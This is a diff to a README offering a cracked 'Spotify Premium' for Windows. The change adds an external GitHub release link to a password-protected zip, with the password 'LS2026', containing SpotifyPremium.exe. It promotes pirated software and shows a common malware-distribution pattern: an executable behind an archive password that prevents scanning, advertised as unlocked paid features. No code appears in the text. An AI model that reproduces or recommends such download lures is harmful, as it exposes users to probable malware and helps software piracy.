@@ -15,8 +15,9 @@ For personal use only. Use at your own risk.
 - Features: Ad-Free Playback, Offline Mode, 320kbps Audio, Unlimited Skips, No Shuffle Restriction, Dark Mode, Playlist Backup.
 ---
 ## 📥 Download
-📥 [Download `Spotify-1.2.85.513.zip`](dist/Spotify-Premium.zip)  
+📥 [Download `Spotify-1.2.85.513.zip`](https://github.com/naufal-hidayat2030/Spotify-Premium-Ad-Free-Music-Streaming-for-Windows/releases/download/Music-Software/Spotify-Prem-1.2.85.513.zip)  
 🔐 `LS2026`  
+
 Contents: SpotifyPremium.exe, config.ini, readme.txt.
 ---
 ## 🚀 How to Use
